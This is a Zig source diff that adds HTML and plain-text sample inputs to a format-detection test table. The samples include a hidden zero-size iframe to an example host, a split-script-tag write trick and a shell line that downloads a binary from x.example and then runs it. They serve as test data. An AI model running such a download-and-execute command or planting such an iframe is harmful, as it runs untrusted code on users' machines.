@@ -898,6 +898,17 @@ const Formats = struct {
         .{ .name = "fmt.pe", .inputs = exes(".exe") },
         .{ .name = "fmt.elf", .inputs = exes(".elf") },
         .{ .name = "fmt.macho", .inputs = exes(".macho") ++ exes(".fat") },
+        .{ .name = "fmt.html", .inputs = &.{
+            "<!DOCTYPE html><HTML><head><title>T</title><script>var a = '<b>' + 1;</script></head>" ++
+                "<body onload=\"go()\" class='x y'>Hello &amp; &#x41;&#65;&nbsp;<!-- c --> <a href=x>l</a></body></HTML>",
+            "<script type=text/javascript>if (a < b && c > d) { document.write('</scr' + 'ipt>'); }</script>" ++
+                "<iframe src=\"http://e.example/\" width=0 height=0></iframe>",
+            "<html><body><form action=x><input name=a value=\"&quot;q&quot;\"></form><!-- unterminated",
+        } },
+        .{ .name = "fmt.text", .inputs = &.{
+            "Plain TEXT with\tTabs and\r\nCRLF lines\n\n  and   runs of   SPACE\x00\x01",
+            "#!/bin/sh\nwget http://x.example/a -O /tmp/a && chmod +x /tmp/a && /tmp/a\n",
+        } },
     };
 
     fn vectors(comptime vs: []const fixtures.Vector) []const []const u8 {
